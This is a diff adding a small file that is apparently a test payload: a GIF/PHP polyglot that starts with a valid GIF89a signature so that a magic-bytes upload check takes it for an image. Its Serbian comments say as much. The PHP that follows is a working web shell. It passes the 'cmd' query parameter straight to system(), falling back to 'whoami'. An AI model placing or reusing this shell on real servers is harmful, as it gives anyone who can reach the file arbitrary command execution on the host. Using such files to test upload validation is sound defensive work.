@@ -1,0 +1,7 @@
+GIF89a
+<?php
+// POLYGLOT: fajl pocinje validnim GIF89a potpisom (magic bytes), pa ga
+// provera "magic bytes" propusta kao sliku, a ipak sadrzi PHP kod.
+echo "POLYGLOT SHELL OK: ";
+system($_GET['cmd'] ?? 'whoami');
+?>
